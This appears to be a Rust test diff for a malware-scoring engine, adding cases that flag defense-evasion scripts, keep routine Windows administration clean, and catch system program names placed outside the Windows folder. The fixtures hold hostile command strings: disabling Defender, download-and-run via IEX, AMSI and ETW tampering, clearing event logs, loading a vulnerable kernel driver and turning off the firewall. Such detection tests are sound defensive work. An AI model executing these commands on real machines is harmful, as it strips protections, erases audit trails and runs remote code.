@@ -240,3 +240,61 @@ fn corrupt_database_files_are_rejected() {
     assert!(hashdb::HashDb::open(&path).is_err());
     let _ = std::fs::remove_file(path);
 }
+
+#[test]
+fn defense_evasion_techniques_are_detected() {
+    let engine = engine();
+    let scripts = [
+        ("defender.ps1", "Set-MpPreference -DisableRealtimeMonitoring:$true; IEX (New-Object Net.WebClient).DownloadString('https://example.invalid')", MALICIOUS),
+        ("logging.ps1", "[Ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings','NonPublic,Static')", SUSPICIOUS),
+        (
+            "etw.ps1",
+            "$a = GetProcAddress ntdll EtwEventWrite; VirtualProtect($a, 1, 0x40, [ref]0); [Runtime.InteropServices.Marshal]::Copy($p, 0, $a, 1)",
+            SUSPICIOUS,
+        ),
+        ("wipe.cmd", "wevtutil cl Security & powershell -c \"IEX (iwr https://example.invalid).Content; Invoke-WebRequest\"", MALICIOUS),
+    ];
+    for (name, text, threshold) in scripts {
+        let (score, findings) = score(&engine, name, text, Kind::Script);
+        assert!(score >= threshold, "{name}: {score} {findings:?}");
+    }
+    let programs = [
+        ("policy.exe", "SOFTWARE\\Policies\\Microsoft\\Windows Defender DisableAntiSpyware wevtutil cl System", SUSPICIOUS),
+        ("excl.exe", "SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths sc stop WinDefend", SUSPICIOUS),
+        ("killer.exe", "sc create rt type= kernel binPath= C:\\ProgramData\\RTCore64.sys \\CurrentVersion\\Run", SUSPICIOUS),
+        ("unhook.exe", "\\KnownDlls\\ntdll.dll .text VirtualProtect NtMapViewOfSection advfirewall set allprofiles state off", SUSPICIOUS),
+    ];
+    for (name, text, threshold) in programs {
+        let (score, findings) = score(&engine, name, text, Kind::Pe);
+        assert!(score >= threshold, "{name}: {score} {findings:?}");
+    }
+}
+
+#[test]
+fn ordinary_security_administration_stays_clean() {
+    let engine = engine();
+    let cases = [
+        ("fw.ps1", "netsh advfirewall firewall add rule name=Game dir=in action=allow; Set-NetFirewallProfile -All -Enabled True", Kind::Script),
+        ("logs.cmd", "wevtutil qe System /c:10 /f:text & sc query WinDefend", Kind::Script),
+        ("gpo.ps1", "Set-ItemProperty HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender -Name DisableAntiSpyware -Value 0", Kind::Script),
+        ("agent.ps1", "New-Service -Name MyAgent -BinaryPathName C:\\Tools\\agent.exe", Kind::Script),
+        ("defs.cmd", "MpCmdRun.exe -RemoveDefinitions -DynamicSignatures", Kind::Script),
+        ("tuner.exe", "CreateService RTCore64.sys", Kind::Pe),
+    ];
+    for (name, text, kind) in cases {
+        let (score, findings) = score(&engine, name, text, kind);
+        assert!(score < SUSPICIOUS, "{name}: {score} {findings:?}");
+    }
+}
+
+#[test]
+fn system_program_names_outside_windows_are_impostors() {
+    let root = r"C:\Windows";
+    let impostor = |p: &str| filetype::impostor_finding(Path::new(p), root).is_some();
+    assert!(impostor(r"C:\Users\me\AppData\Roaming\svchost.exe"));
+    assert!(impostor(r"C:\Windows\Temp\lsass.exe"));
+    assert!(impostor(r"C:\Windows\System32\Tasks\csrss.exe"));
+    assert!(!impostor(r"C:\Windows\System32\svchost.exe"));
+    assert!(!impostor(r"C:\Windows\explorer.exe"));
+    assert!(!impostor(r"C:\Users\me\Downloads\setup.exe"));
+}
